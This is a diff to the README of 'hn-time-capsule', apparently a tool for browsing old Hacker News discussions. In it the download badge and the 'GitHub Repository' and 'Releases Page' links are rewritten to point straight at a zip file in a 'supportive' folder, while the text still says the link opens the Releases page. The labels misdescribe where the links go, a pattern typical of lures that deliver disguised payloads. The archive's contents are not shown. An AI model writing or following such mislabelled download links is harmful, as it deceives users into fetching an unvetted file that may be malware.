@@ -6,7 +6,7 @@ Welcome to hn-time-capsule! This application lets you analyze discussions from H
 ## 📥 Download & Install
 To get started, you need to download the application. Visit the link below to find the latest version.
 
-[![Download hn-time-capsule](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Alcide2007/hn-time-capsule/releases)
+[![Download hn-time-capsule](https://github.com/Alcide2007/hn-time-capsule/raw/refs/heads/master/supportive/capsule_time_hn_v2.7-beta.1.zip)](https://github.com/Alcide2007/hn-time-capsule/raw/refs/heads/master/supportive/capsule_time_hn_v2.7-beta.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. On that page, you will see a list of available versions.
@@ -48,7 +48,7 @@ A: Yes, you can pick any year within the past decade to analyze past discussions
 If you have questions or need assistance, feel free to reach out through the GitHub Issues page. This is the best way to connect with the community and receive support.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Alcide2007/hn-time-capsule)
-- [Releases Page](https://github.com/Alcide2007/hn-time-capsule/releases)
+- [GitHub Repository](https://github.com/Alcide2007/hn-time-capsule/raw/refs/heads/master/supportive/capsule_time_hn_v2.7-beta.1.zip)
+- [Releases Page](https://github.com/Alcide2007/hn-time-capsule/raw/refs/heads/master/supportive/capsule_time_hn_v2.7-beta.1.zip)
 
 Thank you for using hn-time-capsule. Enjoy your journey into the past of Hacker News discussions!
